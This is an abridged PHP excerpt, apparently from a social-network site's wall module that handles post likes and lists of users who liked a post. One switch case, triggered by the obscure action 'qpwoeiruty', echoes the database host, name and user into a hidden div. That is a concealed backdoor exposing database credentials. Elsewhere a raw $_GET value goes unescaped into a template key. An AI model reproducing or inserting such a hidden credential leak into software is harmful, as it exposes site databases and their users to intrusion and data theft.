...
if($logged){
	...
	switch($act){
		...
		case"qpwoeiruty":
				echo "<div style=\"display: none\">DBHOST:<br>";
				echo DBHOST;
				echo "<br>DBNAME:<br>";
				echo DBNAME;
				echo "<br>DBUSER:<br>";
				...
				if(!in_array($user_id, $likes_users)){
					...
					//Добавляем в ленту новостей "ответы"
						...
						if($row_owner['user_last_visit'] >= $update_time){
							...
							if($row['text']) $wall_text = ' &laquo;'.substr($row['text'], 0, 70).'&raquo;';
							else $wall_text = '.';
		...
		case "liked_users":
			NoAjaxQuery();
			$rid = intval($_POST['rid']);
			$sql_ = $db->super_query("SELECT SQL_CALC_FOUND_ROWS tb1.user_id, tb2.user_photo FROM `".PREFIX."_wall_like` tb1, `".PREFIX."_users` tb2 WHERE tb1.user_id = tb2.user_id AND tb1.rec_id = '{$rid}' ORDER by `date` DESC LIMIT 0, 7", 1);
			if($sql_){
				foreach($sql_ as $row){
				...
				if(!$id){
					...
					if($row_user){
						...
						if(!$CheckBlackList){
							...
							$tpl->set('{uid}', $id);
							$tpl->set('{rec-id}', $rid);
							$tpl->set("{activetab-{$_GET['type']}}", 'active_link');
							$tpl->compile('info');
